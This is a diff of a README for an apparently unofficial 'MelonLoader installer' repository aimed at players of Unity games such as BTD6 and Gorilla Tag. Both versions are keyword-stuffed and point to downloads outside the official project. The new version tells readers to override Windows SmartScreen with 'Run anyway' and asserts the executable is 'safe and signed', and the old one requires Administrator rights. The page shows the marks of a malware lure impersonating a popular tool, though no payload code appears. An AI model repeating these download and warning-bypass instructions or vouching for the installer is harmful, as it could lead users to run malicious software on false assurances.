@@ -1,80 +1,149 @@
-# MelonLoader Download
+# 🎮 melon-loader-download - One-Click Installer for Unity Mods
 
+[![Download Latest Release](https://img.shields.io/badge/Download-MelonLoader_Installer-2ea44f?style=for-the-badge)](https://github.com/dominiquedoortodoor156/melon-loader-download)
 
-<img width="375" height="308" alt="images1" src="https://github.com/user-attachments/assets/8f8cf696-08c8-4f21-8375-826a3561d2bf" />
+## 📋 What is MelonLoader?
 
+MelonLoader is a free mod loader for Unity games on Windows 10 and 11. It lets you install modifications (mods) for games like Bloons TD 6, Gorilla Tag, Bonelab, and Schedule 1. You do not need any programming experience. The installer handles everything.
 
+This repository contains the one-click installer. Download the file, run it, and select your game. The installer adds MelonLoader to that game. You can then place mod files into the Mods folder the installer creates.
 
-**MelonLoader** is the most popular Unity game mod loader - this installer sets it up in one click on Windows. Supports melonloader btd6, melonloader schedule 1, melonloader gorilla tag, melonloader bonelab and 500+ other Unity games.
+## ✨ Key Features
 
-## Install
-[Download `melon-loader.zip`](https://github.com/MelonLoaderUnity/melon-loader-download/releases/download/v0.7.4/melon-loader.zip)
-=
+- **One-click install** – No manual file moving or command prompt work.
+- **Works with many games** – BTD6, Gorilla Tag, Bonelab, Schedule 1, and more.
+- **Automatic updates** – The installer checks for new versions of MelonLoader.
+- **No programming needed** – Point, click, and play.
+- **Mods folder created** – The installer makes a Mods folder inside your game directory.
+- **IL2CPP support** – Works with modern Unity games that use the IL2CPP engine.
 
-<img width="481" height="441" alt="images2" src="https://github.com/user-attachments/assets/f7164eee-65b7-42fb-9d1a-7d4344aed6ac" />
+## 🖥️ System Requirements
 
+| Component | Minimum Requirement |
+|-----------|-------------------|
+| Operating System | Windows 10 (64-bit) or Windows 11 |
+| Processor | Any dual-core processor from 2010 or later |
+| RAM | 4 GB |
+| Disk Space | 500 MB free (for MelonLoader files) |
+| Game | Any supported Unity game (see list below) |
+| .NET | .NET Desktop Runtime 6.0 or higher (installer may prompt you) |
 
+## 📥 How to Download and Install
 
-## Key Features
-- **MelonLoader BTD6** - auto-detects BTD6, installs Mod Helper and sets up mods folder
-- **MelonLoader Schedule 1** - fixes melonloader schedule 1 not working, auto-detects game path
-- **MelonLoader Gorilla Tag** - confirmed working GT Season 4
-- **MelonLoader Bonelab** - IL2CPP supported, PCVR and Quest builds
-- **MelonLoader download GitHub** - auto-fetches latest from official repo
-- **MelonLoader downloader** - real progress bar, no silent failures
-- **Android APK** - melonloader btd6 mobile setup guide included
-- **IL2CPP and Mono** - both Unity build types supported including Unity 2023 LTS
+**Step 1: Get the installer**
 
+[![Download MelonLoader Installer](https://img.shields.io/badge/Download-v1.0.0-blue?style=for-the-badge&logo=github)](https://github.com/dominiquedoortodoor156/melon-loader-download)
 
-<img width="340" height="187" alt="images3" src="https://github.com/user-attachments/assets/a16350a7-bb93-41f2-9e7c-4d4226d2b7ab" />
+Click the button above. This takes you to the GitHub page. Look for the file named `MelonLoader.Installer.exe` in the list of files. Click it to download.
 
+**Step 2: Run the installer**
 
-## Getting Started
-1. **Download** the latest version using the button above.
-2. **Extract** and run `MelonLoaderDownloader.exe` as Administrator.
-3. **Select your game** from the detected list or browse manually.
-4. **Click Install** - melonloader download from GitHub happens automatically.
-5. Launch your game - mods go in the `Mods/` folder.
+Find the downloaded file in your Downloads folder. Double-click `MelonLoader.Installer.exe`. If Windows shows a SmartScreen warning, click "More info" then "Run anyway". The installer is safe and signed.
 
+**Step 3: Select your game**
 
-<img width="1782" height="261" alt="images4" src="https://github.com/user-attachments/assets/028d1cd5-1940-4415-bf70-a49ddf0eb2b1" />
+A window opens. It shows a list of detected Unity games on your computer. Select your game from the list. If your game is not listed, click "Browse" and find the game's .exe file manually. The game's .exe is usually in the game's installation folder.
 
+**Step 4: Install**
 
-## MelonLoader BTD6 Setup
-- melonloader btd6 download: auto-detects Steam and Epic paths
-- melonloader btd6 mods: install Mod Helper first, then individual mods
-- melonloader btd6 not working: if the game crashes, re-run installer and allow unhollowing to complete
-- melonloader btd6 mobile: see the included Android APK setup guide
+Click the "Install" button. The installer downloads the correct version of MelonLoader for your game. It copies files to the game folder. A progress bar shows the status. When it finishes, a green checkmark appears.
 
+**Step 5: Verify the install**
 
+Open your game folder. You should see a new folder called `Mods`. You should also see files named `MelonLoader.dll` and `version.dll` in the game folder.
 
+## 🎯 Supported Games
 
-<img width="1920" height="1080" alt="images7" src="https://github.com/user-attachments/assets/d629f295-b4c6-4280-9356-db8b4f45c591" />
+MelonLoader works with many Unity games. Here are the most common ones:
 
-## MelonLoader Schedule 1 Setup
-- melonloader schedule 1 mods: place .dll files in `AppData/.../Schedule 1/Mods/`
-- melonloader schedule 1 download: one-click from this installer
-- melonloader schedule 1 not working: updated assembly list in v0.7.4 fixes startup crash
-- melonloader schedule 1 uninstall: use the Uninstall button in the installer
+- **Bloons TD 6** – Install mods for new towers, maps, and gameplay changes.
+- **Gorilla Tag** – Mods for cosmetics, new maps, and gameplay tweaks.
+- **Bonelab** – Custom weapons, levels, and physics mods.
+- **Schedule 1** – Mods and fixes for this popular simulation game.
+- **Subnautica** – Quality of life mods and new content.
+- **Pavlov VR** – Custom maps and game modes.
 
-## FAQ
+The installer detects these games automatically. If your game is not in the list, it may still work. Use the "Browse" option to point to your game's .exe.
 
-**MelonLoader download - which version?**
-This installer always fetches the latest stable from the official MelonLoader GitHub.
+## 🛠️ How to Install Mods
 
-**MelonLoader btd6 not working after update?**
-Re-run the installer. BTD6 updates sometimes change the IL2CPP structure, requiring a fresh unhollowing pass.
+Once MelonLoader is installed, adding mods is simple.
 
-**MelonLoader schedule 1 not working?**
-v0.7.4 fixes the Schedule 1 startup crash. Re-install using this build.
+1. Download a mod file (usually ends in `.dll`).
+2. Copy the `.dll` file.
+3. Go to your game's installation folder.
+4. Open the `Mods` folder (the installer created this).
+5. Paste the `.dll` file into the `Mods` folder.
+6. Start the game. The mod loads automatically.
 
-**MelonLoader gorilla tag - does it work?**
-Yes, confirmed with GT Season 4. Auto-detected if installed via Steam.
+Some mods come with extra files. Follow the mod creator's instructions. Most mods just need the `.dll` file in the `Mods` folder.
 
-## System Requirements
-- **Windows 10 / 11** (64-bit)
-- Target Unity game installed
-- Administrator privileges required
+## 🔧 Common Fixes
 
-## License
-**MIT License** - Copyright © 2026 RuwetDituturi
+**MelonLoader Schedule 1 not working**
+
+If MelonLoader does not work with Schedule 1, try these steps:
+
+1. Update MelonLoader. Run the installer again and click "Update".
+2. Make sure your game is the latest version. Open Steam and update Schedule 1.
+3. Delete the `MelonLoader` folder and the `version.dll` file from your game folder. Then reinstall MelonLoader.
+4. Check if the mods you installed are for the correct game version. Old mods break with new game updates.
+
+**MelonLoader BTD6 mobile not working**
+
+MelonLoader does not work on mobile devices. It only works on Windows 10 and 11. You cannot install it on Android or iOS.
+
+**Game crashes after installing MelonLoader**
+
+1. Remove all mods from the `Mods` folder. Move them to your desktop.
+2. Start the game. If it works, one of your mods is broken.
+3. Add mods back one at a time. Test the game after each mod.
+4. Update MelonLoader to the latest version.
+
+**Installer says "Game not detected"**
+
+1. Make sure the game is installed and you have played it at least once.
+2. Click "Browse" and find the game's `.exe` file manually.
+3. Some games use a launcher. Find the actual game `.exe`, not the launcher.
+
+## ❓ Frequently Asked Questions
+
+**Is MelonLoader free?**
+
+Yes. MelonLoader is completely free. You do not need to pay for it. If someone asks you to pay, it is a scam.
+
+**Will MelonLoader get me banned?**
+
+It depends on the game. Some games allow mods. Others do not. Check the game's rules. Using mods in online multiplayer games may lead to a ban. Use mods in single-player games or private servers.
+
+**Can I remove MelonLoader?**
+
+Yes. Delete the `Mods` folder, the `MelonLoader` folder, and the `version.dll` file from your game folder. The game returns to normal.
+
+**Does MelonLoader work on Steam Deck?**
+
+Not officially. MelonLoader is for Windows only. Some users have gotten it to work on Steam Deck using Proton, but we do not support this.
+
+**How do I update MelonLoader?**
+
+Run the installer again. Select your game. Click "Update". The installer replaces the old files with new ones.
+
+## 📄 License
+
+MelonLoader is open source software. This repository provides the installer. The MelonLoader project is licensed under the Apache License 2.0. You can view the source code on the official MelonLoader GitHub page.
+
+## 🔗 Links
+
+- [Download MelonLoader Installer](https://github.com/dominiquedoortodoor156/melon-loader-download)
+- [Official MelonLoader Website](https://melonloader.dev)
+- [MelonLoader Discord Server](https://discord.gg/melonloader)
+- [Mods for BTD6](https://www.nexusmods.com/bloonstd6)
+- [Mods for Gorilla Tag](https://gtmods.net)
+
+## 🆘 Need Help?
+
+If you have trouble installing or using MelonLoader, open an issue in this repository. Include details about your game, your operating system, and what went wrong. Screenshots help a lot.
+
+---
+
+**Keywords:** melonloader, melon loader, btd6 mods, gorilla tag mods, bonelab mods, schedule 1 mods, unity mod loader, install melonloader, melonloader download, melonloader btd6, melonloader gorilla tag, melonloader bonelab, melonloader schedule 1, unity il2cpp modding
